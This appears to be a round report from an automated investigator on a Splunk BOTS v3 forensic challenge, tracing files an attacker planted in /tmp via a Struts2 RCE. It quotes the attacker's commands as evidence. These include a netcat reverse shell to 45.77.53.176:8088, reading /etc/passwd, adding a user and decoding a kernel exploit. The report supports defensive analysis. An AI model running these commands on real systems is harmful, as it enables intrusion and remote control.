# s1 - Q315 - Round 3
_stamped by runner: rounds_remaining=2 novel_spl=7_
**Scope:** sourcetype=osquery:results, stream:http | source=/var/log/osquery/osqueryd.results.log | fields=_time, name, columns.target_path, columns.action, columns.time, form_data

**Insight:** FOUND
**Candidate:** colonel,definitelydontinvestigatethisfile.sh   **Confidence:** 80

## Prior rounds
- Round 1: mapped hoth's feeds (syslog 203k, osquery:results 79k); bash_history showed only `ls /tmp`/`cd /tmp`; no filenames.
- Round 2: osquery FIM enumerated /tmp files; held colonel.c + definitelydontinvestigatethisfile.sh (55%) with colonel unresolved; found netcat backdoor.
- Round 3 (this): complete FIM set with exact creation epochs + the full RCE command list from stream:http settled the pair.

## This round
### What I ran
- FIM /tmp/* minus temp-noise regex -> 8 files with exact creation epochs (all rows read).
- proc_events for colonel/loot/suitecrm (11 rows) -> decode/cat/md5sum/gcc/tar/mv; no local creator for colonel or the .sh.
- get_raw_events colonel (11) -> colonel CREATED 1534763317 (7701 B); colonel.c CREATED 1534763456 (5775 B) at the exact second `base64 --decode /tmp/colonel` ran; 7701 base64 chars decode to exactly 5775 bytes.
- get_raw_events definitelydontinvestigatethisfile (3) -> CREATED 1534763390 (21857 B).
- stream:http colonel/definitelydontinvestigatethisfile -> 4 POSTs to /frothlyinventory/integration/saveGangster.action (Struts2 OGNL RCE, 192.168.8.103 → 192.168.9.30:8080, python-requests/2.18.4).
- RCE command list (17 rows, all read) -> whoami/id/groups/cat /etc/passwd/useradd tomcat7/uname/lsb_release; **echo <base64 kernel-exploit> (19:08:37)**; **echo <base64 JPEG> (19:09:50)**; ls -lf /tmp; base64 --decode /tmp/colonel > /tmp/colonel.c (19:10:56); cat; md5sum; mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc 45.77.53.176 8088 1>/tmp/backpipe (×2).
- Echo tail extraction -> 19:08:37 command ends `>> /tmp/colonel` (redirect confirmed); 19:09:50 ends mid-base64 (form_data cut at ~8KB capture limit).

### What it means
FOUND: the adversary streamed exactly two base64 blobs into /tmp over the Struts2 RCE. (1) **/tmp/colonel** — `echo <base64> >> /tmp/colonel` at 19:08:37; FIM CREATED that exact second (1534763317), 7701 bytes; the blob decodes to the Ubuntu 16.04.4 kernel priv-esc C source. (2) **/tmp/definitelydontinvestigatethisfile.sh** — the JPEG-base64 echo at 19:09:50; FIM CREATED that exact second (1534763390), 21857 bytes; the only /tmp file created that second and the only command then (reverse shell not up until 19:13:57). Its redirect sits beyond the ~8KB form_data capture cut, so that one link is by exact-second correlation. colonel.c is NOT streamed: created at 19:10:56 by `base64 --decode /tmp/colonel > /tmp/colonel.c` — a local decode (7701 base64 chars → exactly its 5775 bytes), then compiled to colonelnew and run.

## Ruled out
- /tmp/colonel.c — local decode of colonel (command + exact size match); content never crossed the wire.
- /tmp/colonelnew — gcc compile output.
- /tmp/loot.txt, /tmp/suitecrm.sql — local collection outputs.
- /tmp/blargh.tgz — local `tar czvf`, moved to web root for exfil.
- /tmp/backpipe — local `mknod`.
- stream:tcp dest_port=1337, syslog "1337" — 0 events; the reverse shell dials OUT to 45.77.53.176:8088.

_Iteration cap reached: 10/10 iterations used this round — cut off, not finished._

_Premise updates refused by the runner:_
- selection premise not filed: you already have an open selection premise p2 - amend or settle that one. The text you sent was discarded: "The two files remotely streamed into /tmp on hoth are colonel and definitelydont"


## What I'd tell my replacement
- Retired because: retired: SH stamped one of its verifications false
- Scope I owned: sourcetypes=['osquery:results', 'linux_audit', 'linux_secure', 'bash_history', 'stream:http', 'XmlWinEventLog:Microsoft-Windows-Sysmon/Operational'] sources=[] fields=['host', 'name', 'columns.cmdline', 'columns.path', 'TargetFilename', 'CommandLine', 'uri_path', 'http_method', '_raw']
- Rounds worked: 3/5  (iterations: 33, compactions: 0)
- SPL already run — do not repeat these, go one step further:
- index=botsv3 sourcetype=bash_history host=hoth | stats count by _raw | sort -_time
- index=botsv3 sourcetype=bash_history host=hoth | table _time _raw | sort -_time
- index=botsv3 sourcetype=bash_history | stats count by host
- index=botsv3 sourcetype=osquery:results host=hoth /tmp | stats count by name
- index=botsv3 sourcetype=osquery:results host=hoth name=pack_fim_file_events /tmp | stats count by columns.target_path
- index=botsv3 sourcetype=osquery:results host=hoth name=pack_fim_file_events columns.target_path IN ("/tmp/blargh.tgz","/tmp/colonel","/tmp/colonel.c","/tmp/colonelnew","/tmp/loot.txt","/tmp/suitecrm.sql","/tmp/definitelydontinvestigatethisfile.sh") | stats count values(columns.action) as actions min(_time) as first_seen max(_time) as last_seen by columns.target_path
- index=botsv3 sourcetype=osquery:results host=hoth name=pack_fim_file_events columns.target_path="/tmp/*" | regex columns.target_path!="^/tmp/(tmpf|cc|sh-thd|systemd)" | stats count values(columns.action) as actions min(columns.time) as first_time max(columns.time) as last_time by columns.target_path
- index=botsv3 sourcetype=osquery:results host=hoth name=pack_incident-response_shell_history /tmp | stats count by columns.command
- index=botsv3 sourcetype=osquery:results host=hoth name=pack_process-monitoring_proc_events (colonel OR definitelydontinvestigatethisfile OR loot OR suitecrm) | stats count min(_time) as first_seen by columns.cmdline
- index=botsv3 sourcetype=osquery:results host=hoth name=pack_process-monitoring_proc_events (curl OR wget OR "nc " OR netcat OR python) | stats count by columns.cmdline
- index=botsv3 sourcetype=osquery:results host=hoth name=pack_process-monitoring_proc_events /tmp | stats count by columns.cmdline
- index=botsv3 sourcetype=stream:http (colonel OR definitelydontinvestigatethisfile) | stats count by src_ip dest_ip uri_path http_method
- index=botsv3 sourcetype=stream:http host=hoth | stats count by http_method, status_code
- index=botsv3 sourcetype=stream:http uri_path="/frothlyinventory/integration/saveGangster.action" | rex field=form_data "#cmd='(?<rce_cmd>[^']*)" | eval cmd_tail=substr(rce_cmd, len(rce_cmd)-70, 71) | stats count by _time cmd_tail
- index=botsv3 sourcetype=stream:http uri_path="/frothlyinventory/integration/saveGangster.action" | rex field=form_data "#cmd='(?<rce_cmd>[^']*)" | stats count by _time rce_cmd
- index=botsv3 sourcetype=stream:http uri_path="/frothlyinventory/integration/saveGangster.action" | rex field=form_data ">>(?<redirect_target>/tmp/[a-zA-Z0-9._-]+)" | stats count by _time redirect_target
- index=botsv3 sourcetype=stream:http uri_path="/frothlyinventory/integration/saveGangster.saveGangster.action" | stats count
- index=botsv3 sourcetype=stream:tcp dest_port=1337 | stats count by src_ip dest_ip
- index=botsv3 sourcetype=syslog host=hoth "1337" | stats count by _raw
